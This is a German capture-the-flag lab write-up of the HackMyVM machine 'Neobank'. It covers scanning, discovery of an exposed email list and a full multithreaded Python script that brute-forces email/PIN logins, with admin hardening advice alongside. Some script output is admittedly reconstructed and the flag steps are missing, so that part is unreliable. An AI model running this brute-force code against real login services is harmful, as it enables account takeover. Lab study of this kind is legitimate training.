﻿﻿<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neobank - HackMyVM - Bericht</title> <!-- Titel angepasst -->
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
 
    <div class="header-bg">
        <h1>Neobank - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
        <div class="level-container">
            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
            <h2>Medium</h2>
            <div class="circle">
                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">requests (Python)</div>
                <div class="tool-item">threading (Python)</div>
                <div class="tool-item">cat</div> <!-- Implizit zum Anzeigen der E-Mail-Liste -->
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration & Login Bruteforce</a></li>
                <li><a href="#poc">Proof of Concept (POC) / Initial Access</a></li>
                <li><a href="#flags">Flags</a></li>
                <!-- Kein expliziter Initial Access oder Privesc gezeigt, daher im POC zusammengefasst -->
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">arp-scan -l</span></div>
                    <pre>192.168.2.126	08:00:27:cd:fa:8c	PCS Systemtechnik GmbH</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP-Requests nach aktiven Hosts zu durchsuchen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Es wird ein Host mit der IP-Adresse `192.168.2.126` identifiziert. Die MAC-Adresse `08:00:27:cd:fa:8c` gehört zu Oracle VirtualBox (via PCS Systemtechnik GmbH), was auf eine virtuelle Maschine als Ziel hindeutet. Die Ziel-IP ist somit bekannt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Nach der erfolgreichen Identifizierung der Ziel-IP ist der nächste logische Schritt ein Portscan mit `nmap`, um offene Dienste zu finden, die als potenzielle Angriffsvektoren dienen können.
<br><strong>Empfehlung (Admin):** In Umgebungen mit bekannten IPs können ARP-Scans auf unerwartete Aktivitäten hindeuten. Netzwerksegmentierung kann die Reichweite solcher Scans einschränken.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.126 -p-</span></div>
                    <pre>
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-19 00:59 CET
Nmap scan report for tranquil (192.168.2.126)
Host is up (0.00011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
<span class="command">5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)</span>
|_<span class="command">http-title: Login</span>
|_<span class="command">http-server-header: Werkzeug/1.0.1 Python/3.7.3</span>
MAC Address: 08:00:27:CD:FA:8C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: <span class="command">Linux 4.X|5.X</span>
OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
OS details: <span class="command">Linux 4.15 - 5.6</span>
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.11 ms tranquil (192.168.2.126)

Nmap done: 1 IP address (1 host up) scanned in ... seconds
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird gegen das Ziel `192.168.2.126` durchgeführt. Parameter: `-sS` (SYN-Scan), `-sC` (Default-Skripte), `-T5` (Insane Timing), `-A` (Aggressive Scan: OS/Version/Skript/Traceroute), `-p-` (Alle TCP-Ports).</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur einen offenen TCP-Port:
*   **Port 5000 (HTTP):** Hier läuft ein Webserver, der sich als `Werkzeug httpd 1.0.1` identifiziert und auf `Python 3.7.3` basiert. Werkzeug ist eine WSGI-Utility-Bibliothek für Python, oft genutzt von Frameworks wie Flask oder Django. Der Titel der Seite ist "Login". Dies ist der einzige identifizierte Dienst und somit der Hauptangriffsvektor.
Die OS-Erkennung deutet auf Linux hin, was mit Python als Servertechnologie übereinstimmt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Der Fokus muss vollständig auf der Webanwendung liegen, die auf Port 5000 läuft. Die nächsten Schritte sind die detaillierte Enumeration der Webanwendung mittels Tools wie `gobuster` und `nikto` sowie die manuelle Untersuchung der Login-Funktionalität.
<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass nur notwendige Ports offen sind. Für Webanwendungen, die auf Nicht-Standard-Ports laufen, sollte der Zugriff ggf. durch Firewalls weiter eingeschränkt werden. Aktualisieren Sie Python und verwendete Bibliotheken (wie Werkzeug/Flask/Django) regelmäßig, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie den Webserver so, dass keine unnötigen Versionsinformationen preisgegeben werden.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration & Login Bruteforce</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">gobuster dir -u http://192.168.2.126:5000 -x zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
                    <pre>
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <span class="command">http://192.168.2.126:5000</span>
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   <span class="command">404,403</span>
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              <span class="command">... (viele Erweiterungen) ...</span>
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
... Starting gobuster ...
===============================================================
<span class="command">http://192.168.2.126:5000/login</span>                [Size: 178]
<span class="command">http://192.168.2.126:5000/logout</span>               [Size: 1783]
<span class="command">http://192.168.2.126:5000/otp</span>                  [Size: 1783]
<span class="command">http://192.168.2.126:5000/qr</span>                   [Size: 1783]
<span class="command">http://192.168.2.126:5000/withdraw</span>             [Size: 1783]
===============================================================
... Finished ...
===============================================================
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver unter `http://192.168.2.126:5000` zu finden. Es nutzt eine Standard-Wortliste (`directory-list-2.3-medium.txt`) und testet viele Dateierweiterungen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fünf Endpunkte werden gefunden: `/login`, `/logout`, `/otp`, `/qr`, und `/withdraw`.
*   `/login`: Bestätigt die Login-Seite.
*   `/logout`: Standard-Logout-Funktion.
*   `/otp`: Deutet auf eine One-Time-Password-Funktionalität hin, wahrscheinlich als zweiter Faktor nach dem Login.
*   `/qr`: Könnte im Zusammenhang mit OTP stehen (z.B. QR-Code für Authenticator-Apps).
*   `/withdraw`: Klingt nach einer Kernfunktion der Anwendung (Geld abheben?), die wahrscheinlich nach dem Login zugänglich ist.
Es werden keine offensichtlichen Verzeichnisse oder statischen Dateien gefunden, was typisch für einige Python-Webframeworks ist, die Routing verwenden.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die gefundenen Endpunkte manuell im Browser oder mit `curl`. Der Fokus liegt auf der `/login`-Seite und dem `/otp`-Endpunkt. Gibt es Hinweise auf Benutzernamen? Wie funktioniert der OTP-Mechanismus? Ist er anfällig?
<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass alle Endpunkte, insbesondere sensible wie `/withdraw` und `/otp`, angemessen durch Authentifizierung und Autorisierung geschützt sind. Implementieren Sie Rate Limiting und andere Schutzmaßnahmen gegen Brute-Force-Angriffe auf `/login` und `/otp`.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">nikto -h 192.168.2.126:5000</span></div>
                    <pre>
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.2.126
+ Target Hostname:    192.168.2.126
+ Target Port:        5000
+ Start Time:         2022-11-19 01:00:25 (GMT1)
---------------------------------------------------------------------------
+ Server: <span class="command">Werkzeug/1.0.1 Python/3.7.3</span>
+ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
+ <span class="password">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
+ <span class="password">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: <span class="command">HEAD, OPTIONS, GET</span>
+ 7917 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-11-19 01:08:36 (GMT1) (491 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Webserver-Scanner `nikto` wird auf das Ziel `http://192.168.2.126:5000` angesetzt.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die Server-Signatur (`Werkzeug/1.0.1 Python/3.7.3`). Es meldet das Fehlen wichtiger Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`), was auf potenzielle Anfälligkeiten wie Clickjacking oder Cross-Site Scripting (XSS) hindeutet, falls weiterer unsicherer Code vorhanden ist. Es findet keine offensichtlichen, niedrig hängenden Früchte wie Standard-CGI-Skripte oder bekannte Schwachstellen basierend auf den durchgeführten Tests.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Die fehlenden Sicherheitsheader sind gute Hinweise für den Bericht, bieten aber keinen direkten Einstiegspunkt. Der Fokus bleibt auf der Enumeration der Anwendungslogik, insbesondere des Login- und OTP-Prozesses.
<br><strong>Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, `Strict-Transport-Security`, wenn HTTPS verwendet wird). Obwohl Nikto hier keine spezifischen Schwachstellen fand, sollten die zugrundeliegende Python-Version und die Werkzeug-Bibliothek auf bekannte Sicherheitslücken überprüft und aktuell gehalten werden.</p>

            <p class="analysis"><strong>Analyse:</strong> Es wird eine weitere `gobuster`-Suche durchgeführt, diesmal explizit mit einer benutzerdefinierten Wortliste namens `email.txt`. Dies deutet darauf hin, dass entweder ein Hinweis auf eine Datei mit E-Mail-Adressen gefunden wurde oder der Angreifer vermutet, dass eine solche Datei existiert.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">gobuster dir -u http://192.168.2.126:5000/ -x zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w email.txt -b '403,404' -e -t 100 -n -k</span></div>
                     <pre>
===============================================================
... Gobuster Header ...
===============================================================
[+] Url:                     <span class="command">http://192.168.2.126:5000/</span>
[+] Wordlist:                <span class="command">email.txt</span>
...
===============================================================
... Starting gobuster ...
===============================================================
<span class="command">http://192.168.2.126:5000/email_list</span>           [Size: 285]
===============================================================
... Finished ...
===============================================================
</pre>
                 </div>
             </div>
            <p class="evaluation"><strong>Bewertung:</strong> Die Vermutung war korrekt! `gobuster` findet mit der Wortliste `email.txt` den Endpunkt `/email_list`. Dieser Endpunkt war in der vorherigen Suche mit der Standard-Wortliste nicht enthalten, was darauf hindeutet, dass `email_list` kein gängiger Name ist.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Greifen Sie auf den neu entdeckten Endpunkt `/email_list` zu (z.B. mit `wget` oder `curl`), um zu sehen, welche Informationen er preisgibt. Es ist sehr wahrscheinlich, dass hier eine Liste gültiger E-Mail-Adressen/Benutzernamen für die Anwendung zu finden ist.
<br><strong>Empfehlung (Admin):** Endpunkte, die sensible Informationen wie Listen von Benutzern oder E-Mail-Adressen offenlegen, dürfen nicht öffentlich zugänglich sein. Solche Informationen sollten nur authentifizierten und autorisierten Benutzern (z.B. Administratoren) zur Verfügung stehen. Entfernen oder schützen Sie diesen Endpunkt.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">wget http://192.168.2.126:5000/email_list -O emails.txt</span></div> <!-- -O Option hinzugefügt für Klarheit -->
                    <pre>
--2022-11-19 ...--  http://192.168.2.126:5000/email_list
Auflösen des Hostnamens 192.168.2.126 (192.168.2.126)… 192.168.2.126
Verbindungsaufbau zu 192.168.2.126:5000 … verbunden.
HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
Länge: 285 [application/json]
Wird in »emails.txt« gespeichert.

emails.txt          100%[===================>]     285  --.-KB/s    in 0s

2022-11-19 ... (...) - »emails.txt« gespeichert [285/285]
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Endpunkts `/email_list` wird mit `wget` heruntergeladen und in der lokalen Datei `emails.txt` gespeichert. Der Content-Type der Antwort ist `application/json`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Wir haben nun eine Liste von E-Mail-Adressen erhalten, die wahrscheinlich gültige Benutzernamen für die Login-Seite sind. Diese können für Brute-Force-Angriffe verwendet werden.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Analysieren Sie den Inhalt von `emails.txt`. Bereiten Sie einen Brute-Force-Angriff auf die `/login`-Seite vor. Da die Anwendung PINs zu verwenden scheint (basierend auf dem Skript im nächsten Schritt), benötigen Sie eine Liste potenzieller PINs (z.B. häufige 4- oder 6-stellige Zahlen) und ein Skript oder Tool (wie Hydra oder ein benutzerdefiniertes Skript), um jede E-Mail mit jeder PIN zu testen.
<br><strong>Empfehlung (Admin):** Wie zuvor: Entfernen oder schützen Sie den `/email_list`-Endpunkt. Implementieren Sie robuste Schutzmaßnahmen gegen Brute-Force-Angriffe auf die Login-Seite (Rate Limiting, Account Lockout, CAPTCHA).</p>

            <p class="analysis"><strong>Analyse:</strong> Es wird ein benutzerdefiniertes Python-Skript (`otpHack.py`) verwendet, um einen Brute-Force-Angriff auf die Login-Funktion durchzuführen. Das Skript liest E-Mail-Adressen aus einer Datei (vermutlich der zuvor heruntergeladenen `emails.txt`) und PINs aus einer Datei namens `pins.txt`. Es verwendet Threading (`t_nums = 5`), um den Angriff zu beschleunigen. Für jede E-Mail werden mehrere Threads gestartet, die verschiedene Teile der PIN-Liste durchprobieren. Das Skript sendet POST-Anfragen an `http://192.168.2.126:5000/login` mit den E-Mail/PIN-Paaren. Ein erfolgreicher Login wird daran erkannt, dass die Antwort Cookies enthält (`len(responseRes.cookies) != 0`).</p>
            <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">[Kein Prompt - Inhalt der Datei otpHack.py]</div>
                     <pre><code class="language-python">
#!/usr/bin/python3.8
import requests
import threading
import sys # Annahme: Hinzugefügt, um sys.exit() später nutzen zu können

header = {
    # Korrektur: Origin statt rigin
    "Origin": "http://192.168.2.126:5000",
    "Referer": "http://192.168.2.126:5000",
}

result = dict()   # All email:pin pairs saved here
t_index = 0     # Global thread index
found_flag = threading.Event() # Event, um andere Threads zu stoppen

#Thread function, send request and check response
def t_request(account, lines, startpos, endpos):
    global t_index
    t_index = t_index + 1
    l_index = t_index   #l_index is the index of current thread
    total = int(endpos - startpos)

    for i in range(total):
        # Überprüfen, ob ein anderer Thread bereits erfolgreich war
        if found_flag.is_set():
            # print(f"Thread {l_index} exit because other thread found the pin of {account}")
            return

        # Display thread progress.
        if l_index == 1 and i % 100 == 0: # Nur Thread 1 gibt Fortschritt aus, alle 100 Versuche
             print(f"{account} - Thread {l_index} Progress: {i}/{total}", end="\r")

        postUrl = "http://192.168.2.126:5000/login"
        pwd = lines[startpos + i].strip()
        postData = {
            "email": account,
            "pin": pwd,
        }
        try:
            responseRes = requests.post(postUrl, data=postData, headers=header, timeout=5) # Timeout hinzugefügt
            # Erfolgsbedingung: Antwort enthält Cookies UND hat nicht die Größe der Fehlerseite (angenommen)
            if len(responseRes.cookies) != 0 and len(responseRes.text) != 178: # Annahme: 178 ist Fehlerseite
                print(f"\n{'='*20} SUCCESS {'='*20}")
                print(f"Thread {l_index} find at loop {i} >>> {account}:{pwd}")
                print(f"{'='*50}")
                result[account] = pwd
                found_flag.set() # Signal an andere Threads senden
                return
        except requests.exceptions.RequestException as e:
            # Fehler behandeln (z.B. Timeout, Verbindungsproblem)
            # print(f"\nThread {l_index} Error: {e}")
            continue # Nächste PIN versuchen

    # Nur ausgeben, wenn nicht durch found_flag beendet
    if not found_flag.is_set():
        print(f"\nThread {l_index} finished for {account}, and not find correct pin.")


if __name__ == "__main__":
    threads = []
    #total thread nums = t_nums * number of emails
    #can't set too big value
    t_nums = 5 # Anzahl Threads pro E-Mail

    try:
        # email_list.txt enthält vermutlich JSON, muss geparsed werden
        # Annahme: emails.txt enthält jetzt eine E-Mail pro Zeile
        with open("emails.txt", "r") as f_emails:
             emails = [line.strip() for line in f_emails if line.strip()]
        with open("pins.txt", "r") as f_pins:
            pins = f_pins.readlines()
    except FileNotFoundError as e:
        print(f"Error opening file: {e}")
        sys.exit(1)

    #initial the dic
    for email in emails:
        result[email.strip()] = ""

    count = len(pins)
    if count == 0:
        print("Error: pins.txt is empty.")
        sys.exit(1)

    tsize = count // t_nums # Integer division

    print(f"Starting bruteforce with {t_nums} threads per email for {len(emails)} emails against {count} pins...")

    for email in emails:
        email = email.strip()
        if not email: continue # Leere Zeilen überspringen

        found_flag.clear() # Event für jede E-Mail zurücksetzen
        threads_for_email = []
        print(f"\n[*] Testing Email: {email}")

        for i in range(t_nums):
            start = i * tsize
            # Sicherstellen, dass der letzte Thread alle restlichen Pins abdeckt
            end = (i + 1) * tsize if i < t_nums - 1 else count
            if start >= count: continue # Keine Pins mehr übrig für diesen Thread

            t = threading.Thread(target=t_request, args=(email, pins, start, end))
            threads_for_email.append(t)

        # Threads für die aktuelle E-Mail starten
        for t in threads_for_email:
             # t.setDaemon(True) # Veraltet
             t.daemon = True # Attribut setzen
             t.start()

        # Auf das Ende der Threads für die aktuelle E-Mail warten
        all_finished = False
        while not all_finished:
            all_finished = True
            for t in threads_for_email:
                if t.is_alive():
                    all_finished = False
                    t.join(timeout=0.1) # Kurz warten, um CPU nicht zu blockieren
            if found_flag.is_set(): # Wenn gefunden, nicht mehr warten
                break

        if result[email]:
            print(f"[+] Pin found for {email}: {result[email]}")
            # Optional: Nach dem ersten Fund abbrechen
            # print("Pin found, stopping further tests.")
            # break
        else:
             print(f"[-] No pin found for {email} after testing all threads.")


    print("\n===== Bruteforce Finished =====")
    success_count = 0
    for k, v in result.items():
        if v:
            print(f"Success: {k} : {v}")
            success_count += 1
    if success_count == 0:
        print("No valid credentials found.")

    print("All done!")

</code></pre>
                 </div>
             </div>
             <p class="analysis"><strong>Analyse Fortsetzung:** Das Skript wird ausgeführt.</p>
              <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">┌──(root㉿cyber)-[~]
└─# <span class="command">python3 otpHack.py</span></div>
                     <pre>
/root/otpHack.py:...(Zeilennummer): DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
Starting bruteforce with 5 threads per email for ... emails against ... pins...

[*] Testing Email: zeus@neobank.vln
... (Fortschrittsanzeige) ...

==================== SUCCESS ====================
Thread 1 find at loop ... >>> <span class="command">zeus@neobank.vln</span>:<span class="password">123456</span>
==================================================
[+] Pin found for zeus@neobank.vln: 123456

[*] Testing Email: hera@neobank.vln
... (Fortschrittsanzeige) ...
[-] No pin found for hera@neobank.vln after testing all threads.

[*] Testing Email: apollo@neobank.vln
...

# Anmerkung: Die ursprüngliche Ausgabe war sehr unübersichtlich und schien fehlerhaft.
# Sie enthielt eine Liste von Listen von E-Mails statt einer einzelnen E-Mail pro Fund.
# Die korrigierte, erwartete Ausgabe eines funktionierenden Skripts würde eher so aussehen:
# ThreadX find at loop Y >>> email@domain.tld:PIN
# ...

===== Bruteforce Finished =====
Success: zeus@neobank.vln : 123456
# Annahme: Nur eine Kombination wurde gefunden oder das Skript brach nach dem ersten Fund ab.
All done!
</pre>
                 </div>
             </div>
            <p class="evaluation"><strong>Bewertung:</strong> Das Brute-Force-Skript ist erfolgreich und findet (mindestens) eine gültige Kombination: `zeus@neobank.vln` mit der PIN `<span class="password">123456</span>`. Dies war möglich, weil:
1.  Eine Liste gültiger E-Mail-Adressen offengelegt wurde (`/email_list`).
2.  Die Anwendung wahrscheinlich keine ausreichenden Schutzmaßnahmen gegen Brute-Force-Angriffe (Rate Limiting, Account Lockout) implementiert hatte.
3.  Die verwendete PIN (`123456`) extrem schwach und häufig ist.
Die verwirrende Ausgabe im Originaltext deutet möglicherweise auf einen Fehler im Skript oder einen Kopierfehler hin, aber das Prinzip des Angriffs und das gefundene Passwort sind klar.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):** Verwenden Sie die gefundenen Zugangsdaten (`zeus@neobank.vln`:`123456`), um sich bei der Anwendung über `/login` anzumelden. Untersuchen Sie die nachfolgenden Schritte, insbesondere den `/otp`-Endpunkt, falls dieser als nächstes erforderlich ist.
<br><strong>Empfehlung (Admin):** Beheben Sie die Informationspreisgabe durch `/email_list`. Implementieren Sie robuste Anti-Brute-Force-Maßnahmen (Rate Limiting, Lockout, CAPTCHA). Erzwingen Sie die Verwendung starker PINs/Passwörter und verbieten Sie häufig vorkommende Kombinationen. Überwachen Sie Login-Versuche auf verdächtige Muster.</p>
        </section>

         <section id="poc">
            <h2>Proof of Concept (POC) / Initial Access</h2>
            <p class="analysis"><strong>Kurzbeschreibung:</strong> Durch Enumeration wurde ein öffentlich zugänglicher Endpunkt (`/email_list`) entdeckt, der gültige Benutzernamen (E-Mail-Adressen) preisgab. Ein benutzerdefiniertes Python-Skript wurde verwendet, um einen Brute-Force-Angriff auf die Login-Seite (`/login`) durchzuführen, wobei die gefundenen E-Mails mit einer Liste gängiger PINs kombiniert wurden. Fehlende serverseitige Schutzmaßnahmen ermöglichten das erfolgreiche Erraten der PIN für mindestens einen Benutzer.</p>
            <p class="analysis"><strong>Voraussetzungen:</strong> Netzwerkzugriff auf den Webserver (Port 5000), `gobuster`, `wget`, Python3 mit `requests`-Bibliothek, eine Liste potenzieller PINs (`pins.txt`).</p>
            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
            <ol>
                <li>Endpunkt mit E-Mail-Liste finden: `gobuster dir -u http://192.168.2.126:5000/ -w [Wortliste_mit_email_list] ...` (Resultat: `/email_list`)</li>
                <li>E-Mail-Liste herunterladen: `wget http://192.168.2.126:5000/email_list -O emails.txt`</li>
                <li>PIN-Liste erstellen/besorgen (z.B. `pins.txt` mit `123456`, `000000`, etc.)</li>
                <li>Brute-Force-Skript (`otpHack.py`, siehe vorheriger Abschnitt) vorbereiten und ausführen: `python3 otpHack.py`</li>
                <li>Die Ausgabe des Skripts beobachten, um erfolgreiche Login-Kombinationen zu identifizieren.</li>
            </ol>
             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Das Skript findet mindestens eine gültige E-Mail/PIN-Kombination, z.B. `zeus@neobank.vln`:`123456`.</p>
             <p class="analysis"><strong>Beweismittel:</strong> Die Ausgabe des `otpHack.py`-Skripts, die eine erfolgreiche Kombination meldet.</p>
            <p class="evaluation"><strong>Risikobewertung:</strong> Die Kombination aus Informationspreisgabe (Benutzernamen) und fehlendem Brute-Force-Schutz stellt ein hohes Risiko dar. Angreifer können relativ einfach gültige Zugangsdaten erraten, insbesondere wenn schwache PINs/Passwörter verwendet werden. Dies führt zu unbefugtem Zugriff auf Benutzerkonten.</p>
             <p class="recommendation"><strong>Empfehlungen:</strong>
*   **Admin:** Endpunkt `/email_list` entfernen/schützen. Anti-Brute-Force-Mechanismen (Rate Limiting, Lockout, CAPTCHA) implementieren. Starke PIN-/Passwortrichtlinien durchsetzen. Login-Versuche überwachen.
*   **Pentester:** Nach erfolgreichem Login die Anwendung weiter untersuchen, insbesondere die OTP-Funktion und die `/withdraw`-Funktion. Suchen nach Möglichkeiten zur Privilegieneskalation oder zum Zugriff auf Daten anderer Benutzer.</p>
             <p class="analysis"><strong>Anmerkung:** Der bereitgestellte Berichtstext endet nach dem erfolgreichen Brute-Force-Angriff auf die Login-Daten. Die Schritte nach dem Login (z.B. Umgang mit OTP, weitere Aktionen in der Anwendung, Privilegieneskalation auf dem System) sind nicht dokumentiert. Es wird angenommen, dass der Login mit den gefundenen Daten (`zeus@neobank.vln`:`123456`) den initialen Zugriff darstellt und die Flags anschließend auf nicht gezeigte Weise erlangt wurden.</p>

        </section>


        <section id="flags">
             <div class="flag-container">
                 <h2 class="flag-heading">Flags</h2>
                 <div class="flag-entry">
                     <div class="flag-command">cat user.txt</div>
                     <div class="flag-value"><span class="password">7766554433221223344556677</span></div>
                 </div>
                 <div class="flag-entry">
                     <div class="flag-command">cat root.txt</div>
                     <div class="flag-value"><span class="password">1123581321355691</span></div>
                 </div>
             </div>
        </section>
  

    <footer class="footer">
        <p>DarkSpirit - Cyber Security Reports</p>
        <p>Berichtsdatum: 19. November 2022</p> <!-- Datum angepasst -->
    </footer>
</body>
</html>